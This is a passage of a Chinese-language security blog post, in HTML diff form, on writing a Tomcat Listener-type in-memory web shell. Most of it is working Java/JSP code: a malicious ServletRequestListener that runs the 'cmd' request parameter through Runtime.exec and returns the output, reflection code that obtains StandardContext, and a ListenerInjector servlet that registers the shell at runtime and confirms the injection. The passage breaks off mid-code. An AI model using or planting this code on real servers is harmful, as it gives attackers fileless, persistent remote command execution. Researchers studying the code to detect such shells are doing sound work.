+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204906856.png" srcset="/img/loading.gif" lazyload alt="image-20260408204906780"></p>
+</li>
+</ul>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在应用开始前，先读取了 web.xml，从中读取到 Listeners，并进行加载（<code>listenerStart()</code>）；加载完毕之后会进行逐个读取，对每一个 Listener，都会到 <code>requestInitialized()</code> 方法进去。</p>
+<h1 id="Listner-型内存马-EXP-编写"><a href="#Listner-型内存马-EXP-编写" class="headerlink" title="Listner 型内存马 EXP 编写"></a>Listner 型内存马 EXP 编写</h1><h2 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h2><p>先来梳理一下流程</p>
+<ul>
+<li>恶意代码肯定是写在对应 Listener 的 <code>requestInitialized()</code> 方法里面</li>
+<li>要通过 StandardContext 类的 <code>addApplicationEventListener()</code> 方法把恶意的 Listener 放进去</li>
+<li>其他就是和filter类似的，把 Listener 先放到整个 Servlet 最前面去就好</li>
+</ul>
+<p>反射StandardContext ；接下来放恶意的 Listener，恶意代码逻辑编写写在 <code>requestInitialized</code>触发；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408205331735.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><ul>
+<li><p>编写恶意的代码</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">String</span><span style="color: #E06C75"> cmd</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">            cmd </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">sre</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletRequest</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">org</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">apache</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">catalina</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">connector</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">RequestFacade</span><span style="color: #E06C75"> requestFacade </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">org</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">apache</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">catalina</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">connector</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">RequestFacade</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">sre</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletRequest</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> requestField </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.catalina.connector.RequestFacade&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;request&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">requestField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Request</span><span style="color: #E06C75"> request </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Request) </span><span style="color: #E5C07B">requestField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(requestFacade);</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Response</span><span style="color: #E06C75"> response </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getResponse</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (cmd </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">){</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">InputStream</span><span style="color: #E06C75"> inputStream </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmd).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] bytes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[</span><span style="color: #D19A66">1024</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">while</span><span style="color: #E06C75"> ((i</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">inputStream</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">(bytes)</span><span style="color: #E06C75">) </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #E06C75">){</span></span>
+<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">String</span><span style="color: #ABB2BF">(bytes,</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,i));</span></span>
+<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\r\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">                }</span></span>
+<span class="line"><span style="color: #E06C75">            }</span></span>
+<span class="line"><span style="color: #E06C75">        }</span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">){</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        }</span></span></code></pre></div></div></figure>
+</li>
+<li><p>获取 StandardContext 的代码，并且添加 Listener</p>
+<p>（这个地方反射StandardContext 可不能用前面filter那一套了，需要的东西不一样）</p>
+<p>在 <code>StandardHostValve#invoke</code> 中，可以看到其通过request对象来获取 <code>StandardContext</code> 类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408212649625.png" srcset="/img/loading.gif" lazyload alt="image-20260408212649575"></p>
+<p>同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取（这一步还是挺省事滴）</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> reqF </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;request&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">reqF</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Request</span><span style="color: #E06C75"> req </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Request) </span><span style="color: #E5C07B">reqF</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(request);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">StandardContext</span><span style="color: #E06C75"> context </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (StandardContext) </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>编写一个恶意的Listener</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%!</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Shell_Listener</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ServletRequestListener</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestInitialized</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">sre</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">request</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest) </span><span style="color: #E5C07B">sre</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletRequest</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">cmd</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (cmd </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmd);</span></span>
+<span class="line"><span style="color: #ABB2BF">                } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">                } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">NullPointerException</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">n</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">n</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">                }</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestDestroyed</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">sre</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">}</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>最后添加监听器</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span></span>
+<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">Shell_Listener</span><span style="color: #E06C75"> shell_Listener </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Shell_Listener</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addApplicationEventListener</span><span style="color: #ABB2BF">(shell_Listener);</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure></li>
+</ul>
+<h2 id="最终-EXP"><a href="#最终-EXP" class="headerlink" title="最终 EXP"></a>最终 EXP</h2><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p><code>ListenerInjector</code>（<strong>链条逻辑实现</strong>）</p>
+<p>反射获取 StandardContext，实例化恶意 Listener,接下来直接调用 <code>standardContext.addApplicationEventListener(shell)</code>，添加<code>恶意的Listener</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #FFFFFF">L</span><span style="color: #C678DD">istener</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.core.ApplicationContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.core.StandardContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.*</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebServlet</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServlet</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletRequest</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletResponse</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebServlet</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/injectListener&quot;</span><span style="color: #E06C75">)</span></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ListenerInjector</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HttpServlet</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">protected</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doGet</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 1. 反射获取 StandardContext (逻辑和你 Filter 那个一致)</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">ServletContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">servletContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">appctxField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">appctxField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">applicationContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (ApplicationContext) </span><span style="color: #E5C07B">appctxField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(servletContext);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">stdctxField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">applicationContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">stdctxField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">StandardContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">standardContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (StandardContext) </span><span style="color: #E5C07B">stdctxField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(applicationContext);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 2. 检查是否已经注入过，避免重复注入导致内存炸掉</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">listeners</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getApplicationEventListeners</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">boolean</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">isInjected</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">l</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> listeners) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">l</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ListenerShell&quot;</span><span style="color: #ABB2BF">)) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                    isInjected </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">break</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">                }</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">isInjected) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">// 3. 实例化你的恶意 Listener</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">// 注意：这里建议用你之前写的那个带 RCE 逻辑的 ListenerShell</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">ListenerShell</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">shell</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ListenerShell</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">// 4. 调用 Tomcat 的 API 强行插入</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addApplicationEventListener</span><span style="color: #ABB2BF">(shell);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Successfully Injected Listener Shell!&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Listener Shell already exists.&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {</span></span>
